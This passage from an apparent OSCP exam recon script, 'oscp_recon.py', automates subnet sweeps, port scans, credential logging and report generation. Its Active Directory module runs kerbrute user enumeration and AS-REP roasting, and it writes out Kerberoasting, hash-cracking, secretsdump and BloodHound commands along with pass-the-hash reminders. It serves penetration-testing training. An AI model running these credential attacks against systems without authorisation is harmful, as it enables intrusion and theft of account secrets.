    info(f"notes.md → {notes_path}")
    return notes_path


# ─────────────────────────────────────────────────────────────────
#  STAGE 7 — SCREENSHOT CAPTURE
# ─────────────────────────────────────────────────────────────────
def capture_screenshot(ip, machine_dir):
    head("[STAGE 7] Screenshot Capture")
    ss_dir  = machine_dir / "screenshots"
    ss_dir.mkdir(exist_ok=True)
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = str(ss_dir / f"proof_{ip}_{ts}.png")

    proof_val = input(f"\n{YELLOW}[SS]{RESET} Paste proof.txt contents (or Enter to skip): ").strip()
    if proof_val:
        flags_dir = machine_dir / "flags"
        flags_dir.mkdir(exist_ok=True)
        flag_file = flags_dir / "proof.txt"
        flag_file.write_text(f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}] {ip}\n{proof_val}\n")
        info(f"Proof value saved → {flag_file}")

    if tool_exists("scrot"):
        info(f"Taking screenshot with scrot → {outfile}")
        if subprocess.run(f"scrot '{outfile}'", shell=True).returncode == 0:
            info(f"Screenshot saved → {outfile}")
            return outfile
        warn("scrot failed.")

    if tool_exists("import"):
        info(f"Taking screenshot with import (ImageMagick) → {outfile}")
        if subprocess.run(f"import -window root '{outfile}'", shell=True).returncode == 0:
            info(f"Screenshot saved → {outfile}")
            return outfile
        warn("import failed.")

    warn("No screenshot tool found. Install: sudo apt install scrot")
    warn(f"Manually save your screenshot to: {outfile}")
    return None


# ─────────────────────────────────────────────────────────────────
#  STAGE 8 — CREDENTIAL TRACKER
# ─────────────────────────────────────────────────────────────────
CREDS_FILE = "creds.md"

def get_creds_path(root):
    return Path(root).expanduser() / CREDS_FILE

def load_creds(root):
    path = get_creds_path(root)
    if not path.exists():
        return []
    m = re.search(r'<!--CREDS_JSON:(.*?):END_CREDS_JSON-->', path.read_text(), re.DOTALL)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            return []
    return []

def save_creds(root, creds):
    path  = get_creds_path(root)
    lines = [
        "# OSCP Credential Tracker\n",
        f"_Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M')}_\n",
        "---\n",
        "| IP / Host | Username | Password / Hash | Service | Notes |",
        "|---|---|---|---|---|",
    ]
    for c in creds:
        lines.append(f"| {c.get('ip','')} | {c.get('user','')} | {c.get('secret','')} | {c.get('service','')} | {c.get('notes','')} |")
    lines += [
        "\n---\n",
        "## Password Reuse Reminders\n",
        "- Try every cred against ALL other services and machines\n",
        "- Try username as password\n",
        "- Try: Password1, Password123, Password!\n",
        "- Check for NTLM hash reuse across machines (pass-the-hash)\n",
        f"\n<!--CREDS_JSON:{json.dumps(creds)}:END_CREDS_JSON-->",
    ]
    path.write_text("\n".join(lines))
    info(f"Creds tracker updated → {path}")

def add_cred(root, ip, user, secret, service, notes=""):
    creds = load_creds(root)
    creds.append({
        "ip": ip, "user": user, "secret": secret,
        "service": service, "notes": notes,
        "added": datetime.now().strftime("%Y-%m-%d %H:%M"),
    })
    save_creds(root, creds)
    info(f"Credential added: {user}@{ip} [{service}]")

def interactive_add_cred(root, ip):
    head("[STAGE 8] Credential Tracker")
    existing = [c for c in load_creds(root) if c.get("ip") == ip]
    if existing:
        info(f"Existing creds logged for {ip}:")
        for c in existing:
            print(f"    {c['user']} / {c['secret']} [{c['service']}]")
    while True:
        if input(f"\n{YELLOW}[CREDS]{RESET} Add a credential for {ip}? (y/N): ").strip().lower() != "y":
            break
        user    = input("  Username   : ").strip()
        secret  = input("  Pass/Hash  : ").strip()
        service = input("  Service    : ").strip()
        notes   = input("  Notes      : ").strip()
        if user and secret:
            add_cred(root, ip, user, secret, service, notes)
        else:
            warn("Skipping — username and secret required.")


# ─────────────────────────────────────────────────────────────────
#  STAGE 9 — REPORT BUILDER
# ─────────────────────────────────────────────────────────────────
def build_report(root):
    head("[STAGE 9] Building Exam Report")
    machines_dir = Path(root).expanduser()
    report_path  = machines_dir / "exam_report.md"
    creds        = load_creds(root)

    machines = sorted([
        d for d in machines_dir.iterdir()
        if d.is_dir() and re.match(r'^\d+\.\d+\.\d+\.\d+$', d.name)
    ])

    if not machines:
        err(f"No machine directories found under {machines_dir}")
        return

    info(f"Found {len(machines)} machine(s): {[m.name for m in machines]}")

    lines = [
        "# OSCP Exam Report\n",
        f"**Date:** {datetime.now().strftime('%Y-%m-%d')}",
        "**Candidate:** _Your Name_",
        "**OSID:** _Your OSID_\n",
        "---\n",
        "## Table of Contents\n",
    ]
    for i, m in enumerate(machines, 1):
        anchor = m.name.replace(".", "")
        lines.append(f"{i}. [{m.name}](#{anchor})")
    lines.append(f"{len(machines)+1}. [Credential Summary](#credentialsummary)\n")
    lines.append("---\n")

    for m in machines:
        anchor   = m.name.replace(".", "")
        notes_md = m / "notes.md"
        lines += [f"## {m.name}", f"<a name='{anchor}'></a>\n"]

        if notes_md.exists():
            content = notes_md.read_text()
            content = re.sub(r'^# .*\n', '', content, count=1)  # strip h1 (we have section header)
            lines.append(content)
        else:
            lines.append("_No notes.md found for this machine._\n")

        # Screenshots
        ss_dir = m / "screenshots"
        if ss_dir.exists():
            shots = sorted(ss_dir.glob("*.png"))
            if shots:
                lines.append("\n### Screenshots\n")
                for s in shots:
                    lines.append(f"![{s.name}]({s})\n")

        # Flags
        flags_dir = m / "flags"
        if flags_dir.exists():
            for f in sorted(flags_dir.iterdir()):
                lines.append(f"\n**{f.name}:**\n```\n{f.read_text().strip()}\n```\n")

        lines.append("\n---\n")

    # Creds summary
    lines += [
        "## Credential Summary",
        "<a name='credentialsummary'></a>\n",
        "| IP / Host | Username | Password / Hash | Service | Notes |",
        "|---|---|---|---|---|",
    ]
    for c in creds:
        lines.append(f"| {c.get('ip','')} | {c.get('user','')} | {c.get('secret','')} | {c.get('service','')} | {c.get('notes','')} |")
    lines += ["\n---\n", "_Report generated by oscp_recon.py_\n"]

    report_path.write_text("\n".join(lines))
    info(f"Exam report → {report_path}")

    if tool_exists("pandoc"):
        if input(f"\n{YELLOW}[REPORT]{RESET} pandoc found. Convert to PDF? (y/N): ").strip().lower() == "y":
            pdf_path = machines_dir / "exam_report.pdf"
            run(f"pandoc {report_path} -o {pdf_path} --pdf-engine=wkhtmltopdf")
            info(f"PDF → {pdf_path}")
    else:
        warn("pandoc not found (sudo apt install pandoc) — markdown report only.")

    return report_path


# ─────────────────────────────────────────────────────────────────
#  SUBNET MODE — Host Discovery + Parallel Scanning
# ─────────────────────────────────────────────────────────────────

# Global print lock so parallel threads don't interleave output
_print_lock = Lock()

def locked_print(msg):
    with _print_lock:
        print(msg)

def discover_hosts(subnet):
    """
    Fast host discovery across a subnet using nmap ping sweep.
    Uses -sn (no port scan) with multiple probe types for reliability.
    Returns sorted list of live IP strings.
    """
    head(f"[SUBNET] Host Discovery — {subnet}")
    info("Running nmap ping sweep (ICMP + TCP SYN 80/443 + TCP ACK 80)...")

    cmd = (f"nmap -sn -PE -PS80,443,22,445 -PA80 --min-rate 1000 "
           f"--max-retries 1 -T4 {subnet} -oG -")
    print(f"{DIM}    $ {cmd}{RESET}")

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    output = result.stdout

    # Parse "Up" hosts from grepable output
    live_hosts = []
    for line in output.splitlines():
        if "Status: Up" in line:
            m = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+)', line)
            if m:
                live_hosts.append(m.group(1))

    live_hosts = sorted(live_hosts, key=lambda ip: ipaddress.ip_address(ip))

    if not live_hosts:
        err("No live hosts found. Try running as root for ICMP probes.")
        err("Fallback: sudo nmap -sn --send-eth <subnet>")
    else:
        info(f"Found {len(live_hosts)} live host(s):")
        for h in live_hosts:
            print(f"    {GREEN}{h}{RESET}")

    return live_hosts


def write_subnet_map(root, subnet, live_hosts, results):
    """
    Write ~/oscp/machines/subnet_map.md summarising all discovered hosts,
    their open ports, and whether AD was detected.
    results = { ip: { tcp_ports, udp_ports, has_ad } }
    """
    path  = Path(root).expanduser() / "subnet_map.md"
    ts    = datetime.now().strftime("%Y-%m-%d %H:%M")
    lines = [
        f"# Subnet Map — {subnet}",
        f"\n**Scanned:** {ts}  |  **Live hosts:** {len(live_hosts)}\n",
        "---\n",
        "| IP Address | TCP Ports | UDP Ports | AD Detected | Notes |",
        "|---|---|---|---|---|",
    ]
    for ip in live_hosts:
        r         = results.get(ip, {})
        tcp       = ', '.join(str(p) for p in r.get('tcp_ports', [])) or '—'
        udp       = ', '.join(str(p) for p in r.get('udp_ports', [])) or '—'
        ad        = '✅ YES' if r.get('has_ad') else 'No'
        lines.append(f"| [{ip}](./{ip}/notes.md) | {tcp} | {udp} | {ad} |  |")

    lines += [
        "\n---\n",
        "## Hosts Summary\n",
    ]
    for ip in live_hosts:
        r    = results.get(ip, {})
        tcp  = r.get('tcp_ports', [])
        ad   = r.get('has_ad', False)
        lines.append(f"### {ip}{'  ⚠️ AD' if ad else ''}\n")
        lines.append(f"TCP: `{', '.join(str(p) for p in tcp) or 'none'}`  ")
        lines.append(f"Notes: [{ip}/notes.md](./{ip}/notes.md)\n")

    path.write_text("\n".join(lines))
    info(f"Subnet map → {path}")
    return path


def scan_single_host(ip, root, do_udp, do_autorecon, domain):
    """
    Run the full single-host pipeline for one IP.
    Designed to be called from a thread pool.
    Returns dict of results for subnet_map.
    """
    # All output from this thread is prefixed with the IP
    prefix = f"{CYAN}[{ip}]{RESET}"

    with _print_lock:
        print(f"\n{CYAN}{BOLD}{'═'*60}{RESET}")
        print(f"{CYAN}{BOLD}  Starting scan: {ip}{RESET}")
        print(f"{CYAN}{BOLD}{'═'*60}{RESET}")

    machine_dir = scaffold(ip, root)
    nmap_dir    = machine_dir / "nmap"

    # AutoRecon background
    autorecon_proc = None
    if do_autorecon:
        autorecon_proc = run_autorecon(ip, machine_dir)

    tcp_ports = run_rustscan(ip)

    if tcp_ports:
        run_nmap_tcp(ip, tcp_ports, nmap_dir)
    else:
        with _print_lock:
            warn(f"{prefix} No TCP ports — skipping detail scan.")

    udp_ports = []
    if do_udp:
        if os.geteuid() != 0:
            with _print_lock:
                warn(f"{prefix} UDP requires root.")
        else:
            udp_ports = run_nmap_udp(ip, nmap_dir)

    # AD module — use pre-supplied domain (no interactive prompt in subnet mode)
    port_set = set(tcp_ports)
    has_ad   = bool(port_set & (AD_PORTS | SMB_PORTS))
    if has_ad and domain:
        with _print_lock:
            info(f"{prefix} AD/SMB ports found — running AD module (domain: {domain})")
        run_ad_module_noninteractive(ip, tcp_ports, machine_dir, domain)
    elif has_ad:
        with _print_lock:
            warn(f"{prefix} AD/SMB ports found but no domain supplied — skipping AD module.")
            warn(f"    Re-run: sudo python3 oscp_recon.py {ip}  to run AD module interactively.")

    # Cheatsheet
    if tcp_ports or udp_ports:
        build_cheatsheet(ip, tcp_ports, udp_ports, machine_dir)
    else:
        with _print_lock:
            err(f"{prefix} No open ports found — cheatsheet not generated.")

    # AutoRecon — don't wait in subnet mode, let it run in background
    if autorecon_proc:
        with _print_lock:
            warn(f"{prefix} AutoRecon running (PID {autorecon_proc.pid}) — continuing to next host.")

    with _print_lock:
        info(f"{prefix} Done → {machine_dir}")

    return {
        "tcp_ports": tcp_ports,
        "udp_ports": udp_ports,
        "has_ad":    has_ad,
    }


def run_ad_module_noninteractive(ip, tcp_ports, machine_dir, domain):
    """
    Non-interactive version of run_ad_module for subnet mode.
    Skips ldapdomaindump (needs creds) and just runs kerbrute + enum4linux-ng.
    """
    ad_dir   = machine_dir / "ad_enum"
    ad_dir.mkdir(parents=True, exist_ok=True)
    port_set = set(tcp_ports)
    dc_ip    = ip

    with _print_lock:
        info(f"[{ip}] AD enum: kerbrute + enum4linux-ng (domain: {domain})")

    # kerbrute
    if port_set & AD_PORTS and tool_exists("kerbrute"):
        wl      = "/usr/share/seclists/Usernames/Names/names.txt"
        outfile = str(ad_dir / "kerbrute_users.txt")
        run(f"kerbrute userenum -d {domain} --dc {dc_ip} {wl} -o {outfile} 2>/dev/null")

    # enum4linux-ng
    if port_set & SMB_PORTS:
        if tool_exists("enum4linux-ng"):
            run(f"enum4linux-ng -A {ip} -oJ {str(ad_dir / 'enum4linux_ng')} 2>/dev/null")
        elif tool_exists("enum4linux"):
            run(f"enum4linux -a {ip} > {str(ad_dir / 'enum4linux.txt')} 2>/dev/null")

    # AS-REP Roast against any users found
    kerbrute_out = ad_dir / "kerbrute_users.txt"
    if (port_set & AD_PORTS) and kerbrute_out.exists():
        users_clean = ad_dir / "users_clean.txt"
        run(f"grep 'VALID USERNAME' {kerbrute_out} | awk '{{print $NF}}' | cut -d@ -f1 > {users_clean} 2>/dev/null")
        asrep_out = str(ad_dir / "asrep_hashes.txt")
        run(f"impacket-GetNPUsers {domain}/ -usersfile {users_clean} -dc-ip {dc_ip} "
            f"-request -outputfile {asrep_out} -no-pass 2>/dev/null")

    # Write AD notes
    dc_base  = ',dc='.join(domain.split('.'))
    ad_notes = ad_dir / "ad_attacks.md"
    ad_notes.write_text("\n".join([
        f"# AD Attack Notes — {ip} ({domain})\n",
        "## Quick Wins Checklist\n",
        "- [ ] Kerberoasting\n- [ ] AS-REP Roasting\n- [ ] Password spraying",
        "- [ ] ACL abuse (BloodHound)\n- [ ] DCSync\n- [ ] Pass-the-Hash\n",
        "## Key Commands\n",
        "```bash",
        f"impacket-GetUserSPNs {domain}/user:password -dc-ip {dc_ip} -request -outputfile kerb_hashes.txt",
        f"hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt",
        f"bloodhound-python -d {domain} -u user -p password -ns {dc_ip} -c all",
        f"impacket-secretsdump {domain}/user:password@{dc_ip}",
        f"ldapsearch -x -h {dc_ip} -b 'dc={dc_base}' '(objectClass=*)' | tee ldap_all.txt",
        "```\n",
    ]))


def run_subnet_mode(subnet, root, do_udp, do_autorecon, threads, ping_only, domain):
    """
    Full subnet scan pipeline:
      1. Ping sweep → live hosts
      2. Write initial host list
      3. Parallel per-host full scans (unless --ping-only)
      4. Write subnet_map.md
    """
    head(f"[SUBNET MODE] Target: {subnet}")

    # Validate subnet
    try:
        network = ipaddress.ip_network(subnet, strict=False)
        info(f"Network: {network}  ({network.num_addresses} addresses)")
    except ValueError as e:
        err(f"Invalid subnet: {e}")
        sys.exit(1)

    # Stage 1: Host discovery
    live_hosts = discover_hosts(subnet)

    if not live_hosts:
        err("No live hosts — nothing to scan.")
        return

    # Write raw live hosts file immediately
    root_path  = Path(root).expanduser()
    root_path.mkdir(parents=True, exist_ok=True)
    hosts_file = root_path / "live_hosts.txt"
    hosts_file.write_text("\n".join(live_hosts) + "\n")
    info(f"Live hosts list → {hosts_file}")

    if ping_only:
        info("--ping-only set — stopping after host discovery.")
        info(f"Re-run without --ping-only to scan all {len(live_hosts)} hosts.")
        # Write a basic subnet map with just live hosts
        write_subnet_map(root, subnet, live_hosts, {})
        return

    # Ask for domain once upfront (AD module uses it for all AD hosts)
    if not domain:
        domain_input = input(
            f"\n{YELLOW}[SUBNET]{RESET} Domain name for AD module? (e.g. corp.local or Enter to skip): "
        ).strip()
        domain = domain_input or None

    # Stage 2: Parallel per-host scans
    head(f"[SUBNET] Scanning {len(live_hosts)} hosts with {threads} thread(s)")
    results = {}

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_ip = {
            executor.submit(scan_single_host, ip, root, do_udp, do_autorecon, domain): ip
            for ip in live_hosts
        }
        for future in as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                results[ip] = future.result()
            except Exception as e:
                with _print_lock:
                    err(f"[{ip}] Scan failed: {e}")
                results[ip] = {"tcp_ports": [], "udp_ports": [], "has_ad": False}

    # Stage 3: Write subnet map
    map_path = write_subnet_map(root, subnet, live_hosts, results)

    # Summary
    ad_hosts  = [ip for ip, r in results.items() if r.get("has_ad")]
    print(f"\n{GREEN}{BOLD}{'═'*60}{RESET}")
    print(f"{GREEN}{BOLD}  SUBNET SCAN COMPLETE{RESET}")
    print(f"{GREEN}{BOLD}{'═'*60}{RESET}")
    info(f"Subnet    : {subnet}")
    info(f"Live hosts: {len(live_hosts)}")
    info(f"AD hosts  : {len(ad_hosts)} {ad_hosts if ad_hosts else ''}")
    info(f"Output    : {Path(root).expanduser()}")
    info(f"Map       : {map_path}")
    if ad_hosts:
        print(f"\n{YELLOW}  AD hosts detected — run interactively for full AD enum:{RESET}")
        for h in ad_hosts:
            print(f"    sudo python3 oscp_recon.py {h}")
    print()


# ─────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────
def main():
    banner()
    parser = argparse.ArgumentParser(
        description="OSCP Recon Automation Suite",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    # ── Target (mutually exclusive: single IP or subnet) ──────
    target = parser.add_mutually_exclusive_group()
    target.add_argument("ip",               nargs="?",  help="Single target IP address")
    target.add_argument("--subnet",         metavar="CIDR",
                                            help="Subnet to scan (e.g. 192.168.49.0/24)")

    # ── Global options ─────────────────────────────────────────
    parser.add_argument("--root",           default="~/oscp/machines",
                                            help="Root output dir (default: ~/oscp/machines)")
    parser.add_argument("--no-udp",         action="store_true",  help="Skip UDP scan")
    parser.add_argument("--autorecon",      action="store_true",  help="Run AutoRecon in parallel")
    parser.add_argument("--autorecon-only", action="store_true",  help="AutoRecon only (skip RustScan/Nmap)")

    # ── Single-IP only options ─────────────────────────────────
    parser.add_argument("--screenshot",     action="store_true",  help="Capture proof.txt screenshot")
    parser.add_argument("--add-cred",       nargs=4,
                        metavar=("USER", "SECRET", "SERVICE", "NOTES"),
                        help="Log a credential: --add-cred user pass service notes")

    # ── Subnet-only options ────────────────────────────────────
    parser.add_argument("--threads",        type=int, default=3,
                                            help="Parallel threads for subnet scan (default: 3)")
    parser.add_argument("--ping-only",      action="store_true",
                                            help="Host discovery only — no port scanning")
    parser.add_argument("--domain",         metavar="DOMAIN",
                                            help="AD domain name (subnet mode — skips interactive prompt)")

    # ── Special modes ──────────────────────────────────────────
    parser.add_argument("--report",         action="store_true",  help="Build exam report from all machines")

    args = parser.parse_args()

    root           = args.root
    do_udp         = not args.no_udp
    do_autorecon   = args.autorecon or args.autorecon_only
    autorecon_only = args.autorecon_only

    # ── --report (no IP needed) ────────────────────────────────
    if args.report:
        build_report(root)
        return

    # ── --add-cred ─────────────────────────────────────────────
    if args.add_cred:
        if not args.ip:
            err("--add-cred requires a single target IP as the first argument.")
            sys.exit(1)
        user, secret, service, notes = args.add_cred
        add_cred(root, args.ip, user, secret, service, notes)
        return

    # ── SUBNET MODE ────────────────────────────────────────────
    if args.subnet:
        run_subnet_mode(
            subnet      = args.subnet,
            root        = root,
            do_udp      = do_udp,
            do_autorecon= do_autorecon,
            threads     = args.threads,
            ping_only   = args.ping_only,
            domain      = args.domain,
        )
        return

    # ── SINGLE IP MODE ─────────────────────────────────────────
    if not args.ip:
        err("Target IP or --subnet required.")
        parser.print_help()
        sys.exit(1)

    ip = args.ip

    # Stage 5 — Scaffold first
    machine_dir = scaffold(ip, root)
    nmap_dir    = machine_dir / "nmap"

    # Stage 4 — AutoRecon background
    autorecon_proc = None
    if do_autorecon:
        autorecon_proc = run_autorecon(ip, machine_dir)

    tcp_ports = []
    udp_ports = []

    if not autorecon_only:
        # Stage 1 — RustScan
        tcp_ports = run_rustscan(ip)

        # Stage 2a — Nmap TCP
        if tcp_ports:
            run_nmap_tcp(ip, tcp_ports, nmap_dir)
        else:
            warn("No TCP ports — skipping Nmap TCP detail scan.")

        # Stage 2b — Nmap UDP
        if do_udp:
            if os.geteuid() != 0:
                warn("UDP requires root — run with sudo.")
            else:
                udp_ports = run_nmap_udp(ip, nmap_dir)
        else:
            warn("UDP skipped (--no-udp).")

    # Stage 3 — AD Module (auto-triggered by ports, interactive)
    all_port_set = set(tcp_ports)
    if all_port_set & (AD_PORTS | SMB_PORTS):
        info("AD/SMB ports detected — triggering AD module.")
        run_ad_module(ip, tcp_ports, machine_dir)
    else:
        info("No AD ports detected — AD module skipped.")

    # Stage 6 — Cheatsheet
    if tcp_ports or udp_ports:
        build_cheatsheet(ip, tcp_ports, udp_ports, machine_dir)
    elif autorecon_only:
        warn("--autorecon-only: re-run without flag after AutoRecon finishes to generate notes.md")
    else:
        err("No open ports found — cheatsheet not generated.")

    # Stage 7 — Screenshot (opt-in)
    if args.screenshot:
        capture_screenshot(ip, machine_dir)

    # Stage 8 — Cred Tracker
    interactive_add_cred(root, ip)

    # AutoRecon wait / status
    if autorecon_only and autorecon_proc:
        warn("Waiting for AutoRecon to complete...")
        autorecon_proc.wait()
        rc = autorecon_proc.returncode
        info("AutoRecon finished.") if rc == 0 \
            else err(f"AutoRecon exited {rc}. Check {machine_dir}/autorecon/autorecon.log")
    elif autorecon_proc:
        warn(f"AutoRecon still running (PID {autorecon_proc.pid})")
        warn(f"Monitor: tail -f {machine_dir}/autorecon/autorecon.log")

    print(f"\n{GREEN}{BOLD}[✓] All done.  Output → {machine_dir}{RESET}\n")
    print(f"{DIM}    --screenshot   : capture proof.txt screenshot{RESET}")
    print(f"{DIM}    --add-cred     : log credentials found{RESET}")
    print(f"{DIM}    --report       : build full exam report when done{RESET}\n")


if __name__ == "__main__":
    main()
